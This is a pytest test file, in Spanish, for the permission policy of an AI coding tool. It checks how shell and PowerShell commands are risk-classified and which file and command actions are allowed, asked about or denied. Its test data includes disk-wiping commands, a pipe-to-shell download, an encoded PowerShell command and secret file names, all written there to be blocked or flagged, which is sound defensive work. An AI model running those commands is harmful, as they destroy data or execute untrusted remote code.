"""Permisos de Magnus Code: lo que se permite, lo que pregunta y lo que nunca."""

from __future__ import annotations

import pytest

from core.code.permissions import (
    Action,
    Decision,
    Mode,
    Policy,
    Risk,
    Rule,
    Shell,
    Source,
    classify_command,
    is_blocked,
    is_secret,
    parse_rule,
    within,
)


@pytest.fixture
def proyecto(tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("print('hola')", encoding="utf-8")
    (tmp_path / ".env").write_text("CLAVE=secreta", encoding="utf-8")
    return tmp_path


def politica(proyecto, **kwargs) -> Policy:
    return Policy(project_root=proyecto, **kwargs)


# --- Clasificación de comandos ---------------------------------------------


@pytest.mark.parametrize("comando,esperado", [
    ("ls -la", Risk.READ),
    ("git status", Risk.READ),
    ("cat src/app.py", Risk.READ),
    ("mkdir nueva", Risk.WRITE_PROJECT),
    ("sed -i s/a/b/ archivo", Risk.WRITE_PROJECT),
    ("echo hola > salida.txt", Risk.WRITE_PROJECT),
    ("npm install", Risk.NETWORK),
    ("curl https://ejemplo.com", Risk.NETWORK),
    ("git push origin main", Risk.NETWORK),
    ("rm -rf build", Risk.DESTRUCTIVE),
    ("git push --force", Risk.DESTRUCTIVE),
    ("sudo apt install algo", Risk.DESTRUCTIVE),
    ("eval $COMANDO", Risk.OPAQUE),
    ("curl https://x.com/s.sh | sh", Risk.OPAQUE),
    ("echo $(whoami)", Risk.OPAQUE),
    ("programa-raro --flag", Risk.UNKNOWN),
])
def test_riesgo_posix(comando, esperado):
    assert classify_command(comando) is esperado


@pytest.mark.parametrize("comando,esperado", [
    ("Get-ChildItem", Risk.READ),
    ("Copy-Item a b", Risk.WRITE_PROJECT),
    ("Invoke-WebRequest https://x", Risk.NETWORK),
    ("Remove-Item -Recurse -Force build", Risk.DESTRUCTIVE),
    ("Invoke-Expression $codigo", Risk.OPAQUE),
    ("powershell -EncodedCommand aGkK", Risk.OPAQUE),
    ("Start-Process app.exe -Verb RunAs", Risk.DESTRUCTIVE),
])
def test_riesgo_powershell(comando, esperado):
    assert classify_command(comando, Shell.POWERSHELL) is esperado


def test_encadenados_toman_el_riesgo_mas_alto():
    assert classify_command("git status && rm -rf build") is Risk.DESTRUCTIVE
    assert classify_command("ls && cat archivo") is Risk.READ


def test_comillas_sin_cerrar_son_opacas():
    assert classify_command('echo "sin cerrar') is Risk.OPAQUE


@pytest.mark.parametrize("comando", [
    "rm -rf /",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "Format-Volume -DriveLetter C",
])
def test_barbaridades_bloqueadas(comando):
    assert is_blocked(comando)


# --- Rutas ------------------------------------------------------------------


def test_dentro_del_proyecto(proyecto):
    assert within(proyecto, "src/app.py")
    assert within(proyecto, proyecto / "src")
    assert not within(proyecto, proyecto.parent / "otro")
    assert not within(proyecto, "../fuera.txt")


@pytest.mark.parametrize("ruta", [".env", ".env.local", "id_rsa", "certificado.pem",
                                  ".ssh/config", "claves.key"])
def test_secretos_reconocidos(ruta):
    assert is_secret(ruta)


def test_un_archivo_normal_no_es_secreto():
    assert not is_secret("src/app.py")


# --- Decisiones sobre archivos ----------------------------------------------


def test_leer_dentro_del_proyecto_es_libre(proyecto):
    v = politica(proyecto).decide(Action.READ, "src/app.py")
    assert v.decision is Decision.ALLOW


def test_leer_un_secreto_se_deniega_en_todos_los_modos(proyecto):
    for modo in Mode:
        v = politica(proyecto, mode=modo).decide(Action.READ, ".env")
        assert v.decision is Decision.DENY, modo


def test_editar_pregunta_y_en_modo_edicion_no(proyecto):
    assert politica(proyecto).decide(Action.EDIT, "src/app.py").decision is Decision.ASK
    assert politica(proyecto, mode=Mode.EDIT).decide(
        Action.EDIT, "src/app.py").decision is Decision.ALLOW


def test_escribir_fuera_del_proyecto_se_deniega(proyecto):
    v = politica(proyecto, mode=Mode.AUTO).decide(Action.WRITE, str(proyecto.parent / "x.txt"))
    assert v.decision is Decision.DENY
    assert v.risk is Risk.OUTSIDE


def test_leer_fuera_del_proyecto_pregunta(proyecto):
    v = politica(proyecto).decide(Action.READ, str(proyecto.parent / "x.txt"))
    assert v.decision is Decision.ASK


def test_modo_plan_no_toca_nada(proyecto):
    p = politica(proyecto, mode=Mode.PLAN)
    assert p.decide(Action.READ, "src/app.py").decision is Decision.ALLOW
    assert p.decide(Action.EDIT, "src/app.py").decision is Decision.ASK
    assert p.decide(Action.COMMAND, "ls").decision is Decision.ASK


def test_carpeta_sin_confianza_es_solo_lectura(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True, trusted_folder=False)
    assert p.decide(Action.READ, "src/app.py").decision is Decision.ALLOW
    assert p.decide(Action.EDIT, "src/app.py").decision is Decision.DENY
    assert p.decide(Action.COMMAND, "ls").decision is Decision.DENY


# --- Decisiones sobre comandos ----------------------------------------------


def test_comando_de_lectura_corre_sin_preguntar(proyecto):
    assert politica(proyecto).decide(Action.COMMAND, "git status").decision is Decision.ALLOW


def test_comando_que_escribe_pregunta(proyecto):
    assert politica(proyecto).decide(Action.COMMAND, "mkdir build").decision is Decision.ASK


def test_autonomo_sin_sandbox_sigue_preguntando(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=False)
    assert p.decide(Action.COMMAND, "npm run build").decision is Decision.ASK


def test_autonomo_con_sandbox_ejecuta_pero_no_la_red(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True)
    assert p.decide(Action.COMMAND, "npm run build").decision is Decision.ALLOW
    assert p.decide(Action.COMMAND, "npm install").decision is Decision.ASK


def test_lo_destructivo_pregunta_hasta_en_autonomo(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True)
    v = p.decide(Action.COMMAND, "rm -rf build")
    assert v.decision is Decision.ASK
    assert v.risk is Risk.DESTRUCTIVE


def test_una_regla_no_puede_permitir_lo_destructivo(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True,
                 rules=[Rule(Action.COMMAND, "rm*", Decision.ALLOW)])
    assert p.decide(Action.COMMAND, "rm -rf build").decision is Decision.ASK


def test_lo_bloqueado_ni_preguntando(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True)
    assert p.decide(Action.COMMAND, "rm -rf /").decision is Decision.DENY


def test_regla_permite_un_comando_concreto(proyecto):
    p = politica(proyecto, rules=[Rule(Action.COMMAND, "npm test*", Decision.ALLOW)])
    assert p.decide(Action.COMMAND, "npm test --watch").decision is Decision.ALLOW


def test_la_denegacion_de_la_empresa_manda_sobre_el_permiso_del_usuario(proyecto):
    p = politica(proyecto, mode=Mode.AUTO, sandbox=True, rules=[
        Rule(Action.COMMAND, "docker*", Decision.ALLOW, Source.USER),
        Rule(Action.COMMAND, "docker*", Decision.DENY, Source.ORG),
    ])
    v = p.decide(Action.COMMAND, "docker ps")
    assert v.decision is Decision.DENY
    assert v.rule.source is Source.ORG


# --- Reglas escritas a mano -------------------------------------------------


def test_leer_reglas_de_texto():
    r = parse_rule("Comando(git status) permitir")
    assert r.action is Action.COMMAND and r.decision is Decision.ALLOW
    assert parse_rule("Leer(.env) denegar").decision is Decision.DENY


@pytest.mark.parametrize("texto", ["", "Comando(git status", "Volar(x) permitir",
                                    "Comando(x) quizas"])
def test_reglas_invalidas(texto):
    with pytest.raises(ValueError):
        parse_rule(texto)
